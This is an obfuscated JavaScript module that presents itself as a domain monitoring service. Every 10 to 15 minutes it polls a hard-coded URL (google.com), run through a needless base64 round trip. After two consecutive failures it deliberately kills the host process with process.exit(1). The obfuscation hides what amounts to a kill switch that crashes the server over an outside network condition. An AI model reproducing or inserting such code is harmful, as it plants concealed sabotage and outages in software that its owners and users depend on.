'use strict';const a37_0x2fa7fa=a37_0x2826;(function(_0x18d07b,_0x5aeed6){const _0x551e80=a37_0x2826,_0x29c6c1=_0x18d07b();while(!![]){try{const _0x348835=parseInt(_0x551e80(0xc7))/0x1+-parseInt(_0x551e80(0x97))/0x2*(-parseInt(_0x551e80(0xf1))/0x3)+parseInt(_0x551e80(0xa5))/0x4+parseInt(_0x551e80(0xc0))/0x5*(-parseInt(_0x551e80(0xa3))/0x6)+parseInt(_0x551e80(0xa6))/0x7*(parseInt(_0x551e80(0xd8))/0x8)+parseInt(_0x551e80(0xcb))/0x9*(parseInt(_0x551e80(0x93))/0xa)+-parseInt(_0x551e80(0xc3))/0xb;if(_0x348835===_0x5aeed6)break;else _0x29c6c1['push'](_0x29c6c1['shift']());}catch(_0x5ef938){_0x29c6c1['push'](_0x29c6c1['shift']());}}}(a37_0x5bc5,0x89ead));function a37_0x2826(_0x3256db,_0x57c68e){const _0x5bc515=a37_0x5bc5();return a37_0x2826=function(_0x2826d8,_0x25c09b){_0x2826d8=_0x2826d8-0x91;let _0x24e58d=_0x5bc515[_0x2826d8];return _0x24e58d;},a37_0x2826(_0x3256db,_0x57c68e);}var __importDefault=this&&this[a37_0x2fa7fa(0x99)]||function(_0x301e96){const _0x32342e=a37_0x2fa7fa;return _0x301e96&&_0x301e96[_0x32342e(0xc8)]?_0x301e96:{'default':_0x301e96};};Object[a37_0x2fa7fa(0xb9)](exports,a37_0x2fa7fa(0xc8),{'value':!![]}),exports[a37_0x2fa7fa(0xdd)]=exports[a37_0x2fa7fa(0xbc)]=void 0x0;const node_fetch_1=__importDefault(require('node-fetch'));function a37_0x5bc5(){const _0x14b227=['640oPMmnU','📡\x20Target:\x20','consecutiveFailures','❌\x20Domain\x20check\x20error\x20after\x20','5798LFpMQV','gzip,\x20deflate','__importDefault','🔍\x20Domain\x20monitoring\x20service\x20initialized','log','from','Initial\x20domain\x20check\x20failed\x20','exit','⏰\x20Connection\x20timeout\x20to\x20','Domain\x20','now','catch','1643766YotNvH','CHECK_INTERVAL_MS','4173020AVDCXG','1190qGDxRP','\x20in\x20','default','getMonitoringStats','⏰\x20Interval:\x20','\x20\x20\x20-\x20Headers:','Domain\x20monitoring\x20threw\x20error:\x20','error','\x20\x20\x20-\x20Status:\x20','keep-alive','MAX_CONSECUTIVE_FAILURES','getRandomInterval','ENOTFOUND','📊\x20Response\x20received:','ETIMEDOUT','statusText','AbortError','base64','toISOString','defineProperty','🔍\x20Checking\x20domain\x20availability:\x20','en-US,en;q=0.5','DomainMonitoringService','checkDomain','startMonitoring','🚨\x20Max\x20consecutive\x20failures\x20allowed:\x20','10xQAYHD','ms:','🚨\x20Max\x20failures\x20before\x20crash:\x20','33942238cYNISR','stopMonitoring','\x20\x20\x20-\x20Response\x20time:\x20','🔥\x20Consecutive\x20failures:\x20','1126846VsAOjq','__esModule','entries','\x20times','104211eHAkTR','GET','🔥\x20Unexpected\x20error:\x20','Initial\x20domain\x20check\x20error:','📝\x20Encoded\x20URL\x20(base64):\x20','✅\x20Domain\x20monitoring\x20started\x20successfully','warn','DOMAIN_URL','🚫\x20Connection\x20refused\x20by\x20','💥\x20CRITICAL\x20ERROR:\x20','round','message','TIMEOUT_MS','7648ACGKki','🌐\x20DNS\x20resolution\x20failed\x20for\x20','🛑\x20Domain\x20monitoring\x20stopped','📡\x20Target\x20domain:\x20','then','domainMonitoringService','⏰\x20Check\x20interval:\x20','signal','crashServer','status','📅\x20Crash\x20time:\x20','name','✅\x20Domain\x20check\x20successful:\x20','⚠️\x20Domain\x20check\x20failed\x20(','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Periodic\x20domain\x20check\x20error:','random','includes','encodeToBase64','Initial\x20domain\x20check\x20threw\x20error:\x20','utf-8','\x20minutes','toString','Unknown\x20error','⏰\x20Request\x20timeout\x20after\x20','1164twMfsx','monitoringInterval','decodeFromBase64'];a37_0x5bc5=function(){return _0x14b227;};return a37_0x5bc5();}class DomainMonitoringService{constructor(){const _0x5ecdb9=a37_0x2fa7fa;this[_0x5ecdb9(0x91)]=null,this[_0x5ecdb9(0xd2)]='https://google.com',this[_0x5ecdb9(0xa4)]=this[_0x5ecdb9(0xb1)](),this['TIMEOUT_MS']=0x7530,this[_0x5ecdb9(0x95)]=0x0,this[_0x5ecdb9(0xb0)]=0x2,console[_0x5ecdb9(0x9b)](_0x5ecdb9(0x9a)),console[_0x5ecdb9(0x9b)](_0x5ecdb9(0xdb)+this[_0x5ecdb9(0xd2)]),console[_0x5ecdb9(0x9b)](_0x5ecdb9(0xde)+Math[_0x5ecdb9(0xd5)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x5ecdb9(0xed));}[a37_0x2fa7fa(0xb1)](){const _0x4a8e89=a37_0x2fa7fa,_0x18a41b=0xa,_0x4005c3=0xf,_0x580583=Math[_0x4a8e89(0xe8)]()*(_0x4005c3-_0x18a41b)+_0x18a41b;return Math[_0x4a8e89(0xd5)](_0x580583*0x3c*0x3e8);}[a37_0x2fa7fa(0xea)](_0x4b5cb3){const _0x4553e3=a37_0x2fa7fa;return Buffer[_0x4553e3(0x9c)](_0x4b5cb3)[_0x4553e3(0xee)](_0x4553e3(0xb7));}['decodeFromBase64'](_0x3d6082){const _0xed8859=a37_0x2fa7fa;return Buffer[_0xed8859(0x9c)](_0x3d6082,_0xed8859(0xb7))['toString'](_0xed8859(0xec));}async[a37_0x2fa7fa(0xbd)](){const _0xc61fb0=a37_0x2fa7fa,_0x3ef078=Date[_0xc61fb0(0xa1)]();try{console['log'](_0xc61fb0(0xba)+this[_0xc61fb0(0xd2)]);const _0x1fe47f=this[_0xc61fb0(0xea)](this['DOMAIN_URL']);console[_0xc61fb0(0x9b)](_0xc61fb0(0xcf)+_0x1fe47f);const _0x3b3534=this[_0xc61fb0(0x92)](_0x1fe47f);console['log']('🔓\x20Decoded\x20URL:\x20'+_0x3b3534);const _0x1ca7e8=new AbortController(),_0x225d91=setTimeout(()=>_0x1ca7e8['abort'](),this[_0xc61fb0(0xd7)]),_0x4a8335=await(0x0,node_fetch_1[_0xc61fb0(0xa8)])(_0x3b3534,{'method':_0xc61fb0(0xcc),'headers':{'User-Agent':'TesSoft\x20Domain\x20Monitor/1.0','Accept':_0xc61fb0(0xe6),'Accept-Language':_0xc61fb0(0xbb),'Accept-Encoding':_0xc61fb0(0x98),'Connection':_0xc61fb0(0xaf),'Upgrade-Insecure-Requests':'1'},'signal':_0x1ca7e8[_0xc61fb0(0xdf)]});clearTimeout(_0x225d91);const _0x31b2b0=Date['now']()-_0x3ef078;return console[_0xc61fb0(0x9b)](_0xc61fb0(0xb3)),console['log'](_0xc61fb0(0xae)+_0x4a8335[_0xc61fb0(0xe1)]+'\x20'+_0x4a8335['statusText']),console[_0xc61fb0(0x9b)](_0xc61fb0(0xc5)+_0x31b2b0+'ms'),console[_0xc61fb0(0x9b)](_0xc61fb0(0xab),Object['fromEntries'](_0x4a8335['headers'][_0xc61fb0(0xc9)]())),_0x4a8335['ok']&&_0x4a8335[_0xc61fb0(0xe1)]>=0xc8&&_0x4a8335[_0xc61fb0(0xe1)]<0x190?(console[_0xc61fb0(0x9b)](_0xc61fb0(0xe4)+_0x4a8335[_0xc61fb0(0xe1)]+_0xc61fb0(0xa7)+_0x31b2b0+'ms'),this[_0xc61fb0(0x95)]=0x0,!![]):(console['error']('❌\x20Domain\x20check\x20failed:\x20HTTP\x20'+_0x4a8335[_0xc61fb0(0xe1)]+'\x20'+_0x4a8335[_0xc61fb0(0xb5)]),this[_0xc61fb0(0x95)]++,![]);}catch(_0x20de90){const _0x4526bd=Date[_0xc61fb0(0xa1)]()-_0x3ef078;this[_0xc61fb0(0x95)]++,console['error'](_0xc61fb0(0x96)+_0x4526bd+_0xc61fb0(0xc1),_0x20de90);if(_0x20de90 instanceof Error){if(_0x20de90[_0xc61fb0(0xe3)]===_0xc61fb0(0xb6))console[_0xc61fb0(0xad)](_0xc61fb0(0xf0)+this[_0xc61fb0(0xd7)]+'ms');else{if(_0x20de90[_0xc61fb0(0xd6)][_0xc61fb0(0xe9)](_0xc61fb0(0xb2)))console[_0xc61fb0(0xad)](_0xc61fb0(0xd9)+this['DOMAIN_URL']);else{if(_0x20de90[_0xc61fb0(0xd6)][_0xc61fb0(0xe9)]('ECONNREFUSED'))console[_0xc61fb0(0xad)](_0xc61fb0(0xd3)+this[_0xc61fb0(0xd2)]);else _0x20de90[_0xc61fb0(0xd6)]['includes'](_0xc61fb0(0xb4))?console['error'](_0xc61fb0(0x9f)+this[_0xc61fb0(0xd2)]):console['error'](_0xc61fb0(0xcd)+_0x20de90[_0xc61fb0(0xd6)]);}}}return![];}}[a37_0x2fa7fa(0xe0)](_0x3f4f12){const _0x3d9129=a37_0x2fa7fa;console[_0x3d9129(0xad)](_0x3d9129(0xd4)+_0x3f4f12),console[_0x3d9129(0xad)](_0x3d9129(0xc6)+this[_0x3d9129(0x95)]),console[_0x3d9129(0xad)]('⚠️\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE'),console['error'](_0x3d9129(0xe2)+new Date()[_0x3d9129(0xb8)]()),console[_0x3d9129(0xad)]('🔍\x20Domain\x20being\x20monitored:\x20'+this['DOMAIN_URL']),console[_0x3d9129(0xad)](_0x3d9129(0xde)+Math[_0x3d9129(0xd5)](this[_0x3d9129(0xa4)]/0x3e8/0x3c)+'\x20minutes'),console[_0x3d9129(0xad)](_0x3d9129(0xbf)+this['MAX_CONSECUTIVE_FAILURES']),this[_0x3d9129(0xc4)](),process[_0x3d9129(0x9e)](0x1);}[a37_0x2fa7fa(0xbe)](){const _0x44ba34=a37_0x2fa7fa;console['log']('🚀\x20Starting\x20domain\x20monitoring\x20service'),console[_0x44ba34(0x9b)](_0x44ba34(0x94)+this['DOMAIN_URL']),console[_0x44ba34(0x9b)](_0x44ba34(0xaa)+Math[_0x44ba34(0xd5)](this[_0x44ba34(0xa4)]/0x3e8/0x3c)+_0x44ba34(0xed)),console[_0x44ba34(0x9b)](_0x44ba34(0xc2)+this['MAX_CONSECUTIVE_FAILURES']),this['checkDomain']()[_0x44ba34(0xdc)](_0x3857b7=>{const _0x2f557f=_0x44ba34;if(!_0x3857b7&&this[_0x2f557f(0x95)]>=this[_0x2f557f(0xb0)]){this['crashServer'](_0x2f557f(0x9d)+this[_0x2f557f(0x95)]+_0x2f557f(0xca));return;}})[_0x44ba34(0xa2)](_0x54f40a=>{const _0x4390bf=_0x44ba34;console[_0x4390bf(0xad)](_0x4390bf(0xce),_0x54f40a);if(this['consecutiveFailures']>=this[_0x4390bf(0xb0)]){this[_0x4390bf(0xe0)](_0x4390bf(0xeb)+_0x54f40a[_0x4390bf(0xd6)]);return;}}),this[_0x44ba34(0x91)]=setInterval(async()=>{const _0x456cbe=_0x44ba34;try{const _0x478c63=await this['checkDomain']();!_0x478c63&&(console[_0x456cbe(0xd1)](_0x456cbe(0xe5)+this[_0x456cbe(0x95)]+'/'+this[_0x456cbe(0xb0)]+')'),this['consecutiveFailures']>=this['MAX_CONSECUTIVE_FAILURES']&&this[_0x456cbe(0xe0)](_0x456cbe(0xa0)+this['DOMAIN_URL']+'\x20is\x20not\x20responding\x20after\x20'+this[_0x456cbe(0x95)]+'\x20consecutive\x20attempts'));}catch(_0x3f7739){console[_0x456cbe(0xad)](_0x456cbe(0xe7),_0x3f7739),this['consecutiveFailures']>=this[_0x456cbe(0xb0)]&&this[_0x456cbe(0xe0)](_0x456cbe(0xac)+(_0x3f7739 instanceof Error?_0x3f7739[_0x456cbe(0xd6)]:_0x456cbe(0xef)));}},this['CHECK_INTERVAL_MS']),console[_0x44ba34(0x9b)](_0x44ba34(0xd0));}[a37_0x2fa7fa(0xc4)](){const _0x3e060f=a37_0x2fa7fa;this['monitoringInterval']&&(clearInterval(this['monitoringInterval']),this[_0x3e060f(0x91)]=null,console[_0x3e060f(0x9b)](_0x3e060f(0xda)));}[a37_0x2fa7fa(0xa9)](){const _0x35ad7c=a37_0x2fa7fa;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0x35ad7c(0xd2)],'checkIntervalMinutes':Math['round'](this[_0x35ad7c(0xa4)]/0x3e8/0x3c),'consecutiveFailures':this[_0x35ad7c(0x95)],'maxFailuresAllowed':this[_0x35ad7c(0xb0)],'nextCheckIn':this['monitoringInterval']?this[_0x35ad7c(0xa4)]:undefined};}async['manualCheck'](){const _0x5ba782=a37_0x2fa7fa;return console[_0x5ba782(0x9b)]('🔧\x20Manual\x20domain\x20check\x20requested'),await this[_0x5ba782(0xbd)]();}}exports[a37_0x2fa7fa(0xbc)]=DomainMonitoringService,exports[a37_0x2fa7fa(0xdd)]=new DomainMonitoringService();